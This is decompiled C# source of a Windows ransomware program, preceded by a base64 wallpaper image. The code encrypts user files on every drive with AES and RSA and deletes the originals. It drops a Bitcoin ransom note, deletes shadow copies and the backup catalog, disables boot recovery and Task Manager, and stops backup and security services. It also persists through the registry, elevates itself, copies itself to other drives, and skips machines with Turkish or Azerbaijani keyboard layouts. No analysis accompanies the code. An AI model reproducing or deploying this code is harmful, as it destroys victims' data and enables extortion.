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";

	public static string appMutexStartup = "1qrx0frdqdur0lllc6ezm";

	private static string droppedMessageTextbox = "hack.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	private static bool disableTaskManager = true;

	private static bool checkStopBackupServices = true;

	public static string appMutexStartup2 = "19DpJAWr6NCVT2";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string>
	{
		"Don't worry, you can return all your files!", "", "All your files like documents, photos, databases and other important are encrypted", "", "What guarantees do we give to you?", "", "You can send 3 of your encrypted files and we decrypt it for free.", "", "You must follow these steps To decrypt your files :   ", "1) Write on our e-mail :test@test.com ( In case of no answer in 24 hours check your spam folder",
		"or write us to this e-mail: test2@test.com)", "", "2) Obtain Bitcoin (You have to pay for decryption in Bitcoins. ", "After payment we will send you the tool that will decrypt all your files.)"
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		if (forbiddenCountry())
		{
			MessageBox.Show("Forbidden Country");
			return;
		}
		if (RegistryValue())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
		}
		if (isOver())
		{
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			registryStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
			if (checkStopBackupServices)
			{
				stopBackupServices();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static bool forbiddenCountry()
	{
		string[] array = new string[2] { "az-Latn-AZ", "tr-TR" };
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				string name = InputLanguage.CurrentInputLanguage.Culture.Name;
				if (name == text)
				{
					return true;
				}
			}
			catch
			{
			}
		}
		return false;
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool RegistryValue()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + appMutexRun2);
			object value = registryKey.GetValue(appMutexRun2);
			registryKey.Close();
			if (value.ToString().Length > 0)
			{
				return false;
			}
			return true;
		}
		catch
		{
			return true;
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool checkCrypted = true;
			Parallel.For(0, files.Length, delegate(int i)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (Array.Exists(validExtensions, (string E) => E == extension.ToLower()) && fileName != droppedMessageTextbox)
					{
						FileInfo fileInfo = new FileInfo(files[i]);
						try
						{
							fileInfo.Attributes = FileAttributes.Normal;
						}
						catch
						{
						}
						string text = CreatePassword(40);
						if (fileInfo.Length < 2368709120u)
						{
							if (checkDirContains(files[i]))
							{
								string keyRSA = RSA_Encrypt(text, rsaKey());
								AES_Encrypt(files[i], text, keyRSA);
							}
						}
						else
						{
							AES_Encrypt_Large(files[i], text, fileInfo.Length);
						}
						if (checkCrypted)
						{
							checkCrypted = false;
							string path = location + "/" + droppedMessageTextbox;
							string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
							if (!File.Exists(path) && location != folderPath)
							{
								File.WriteAllLines(path, messages);
							}
						}
					}
				}
				catch (Exception)
				{
				}
			});
			string[] childDirectories = Directory.GetDirectories(location);
			Parallel.For(0, childDirectories.Length, delegate(int i)
			{
				try
				{
					new DirectoryInfo(childDirectories[i]).Attributes &= ~FileAttributes.Normal;
				}
				catch
				{
				}
				encryptDirectory(childDirectories[i]);
			});
		}
		catch (Exception)
		{
		}
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		foreach (string value in array2)
		{
			if (directory.Contains(value))
			{
				return false;
			}
		}
		return true;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>0j8ckUFTF+J+DDRrwiOzWgIqvvr2+PHQW3xQGTnp92jjbplqu70dWJg1cCZy8bE9zX9TzBQuZp6Wf0lMv1Eknen37NmgzTicou7gr+c1do7tq+kYwV/V713kAb+JUdK5apd/FnyAXargZoKkfRnhPqyGtOyf7FE9PQeTlv4S+u/4SRZ6AFNUDuHiJh82QxNDuzsqyPJ10vHMWjjMBcGNDEyE38DU9hy6KOuc17+IhoTt445JDle8iID3bvcmqe0JrgH7Jabnhph5IjgEQkslzQZ1l2BRU+b8GQ/0LjPCadOV+cK9og6DTAFaGT/PR4bv7tqzMIqVdKMqrcBjSTP5RQ==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("UpdateTask", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private static void stopBackupServices()
	{
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0190: Expected O, but got Unknown
		string[] array = new string[42]
		{
			"BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine", "BackupExecManagementService", "vss", "sql", "svc$", "memtas", "sophos", "veeam",
			"backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr", "SavRoam", "RTVscan",
			"QBFCService", "Intuit.QuickBooks.FCS", "YooBackup", "YooIT", "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "QBCFMonitorService", "VeeamTransportSvc",
			"VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService", "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecRPCService", "AcrSch2Svc", "AcronisAgent", "CASAD2DWebSvc",
			"CAARCUpdateSvc", "TeamViewer"
		};
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				ServiceController val = new ServiceController(text);
				val.Stop();
			}
			catch
			{
			}
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
